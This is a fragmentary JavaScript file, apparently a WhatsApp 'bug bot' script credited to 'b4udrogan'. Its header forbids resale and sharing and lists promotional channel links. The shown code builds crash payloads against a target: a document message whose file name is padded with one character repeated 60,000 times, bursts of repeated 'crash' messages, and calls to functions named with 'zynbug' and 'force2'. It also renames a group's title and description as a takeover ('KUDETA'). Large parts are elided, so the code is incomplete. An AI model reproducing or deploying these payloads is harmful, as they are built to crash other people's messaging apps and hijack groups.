/*
       ...
       RESMI DARI b4udrogan [ D.E.V ]

  LARANGAN
 
- DI LARANG MEMPERJUAL SC B4U DROGAN 
- DI LARANG MEMPERBAGI SC B4U DROGAN 

JIKA MELANGGAR LARANGAN YANG DI BERIKAN b4udrogan, YAPIT SE UMUR HIDUP + 7 TURUNAN

JANGAN LUPA SUPPORT

YOUTUBE : https://youtube.com/@b4udrogan
CH TELE : https://t.me/drogan
CH PUBLIC : https://whatsapp.com/channel/0029ValRq0ULikgQ5Y0c0L
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `ZYNXZOO DOCUMENT`+"ྦྷ".repeat(60000),
...
name: "cta_url",
buttonParamsJson: `{
display_text: '𝙔𝙤𝙪𝙏𝙪𝙗𝙚 𝗕𝟰𝗨 𝗗𝗥𝗢𝗚𝗔𝗡',
url: "${global.url}",
...
name: "cta_url",
buttonParamsJson: `{
display_text: '𝗕𝟰𝗨 𝗗𝗥𝗢𝗚𝗔𝗡 𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
...
await Zynxzoo.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗕𝟰𝗨 𝗗𝗥𝗢𝗚𝗔𝗡')
await Zynxzoo.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗕𝟰𝗨 𝗗𝗥𝗢𝗚𝗔𝗡')
...
Zynxzoo.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
...
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
Zynxzoo.sendMessage(Pe, {text: `\`b4u 𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`b4u 𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`b4u 𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`b4u 𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
...
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
Zynxzoo.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
						...
						carouselMessage: {
							cards: [{
								...
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"👤 Owner","url":"https:\\/\\/wa.me\\/923070051625?text=Halo+owner","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
								...
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"🌐 Channel","url":"https://whatsapp.com/channel/0029ValNvcn9hXF0GBPgzF1K","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
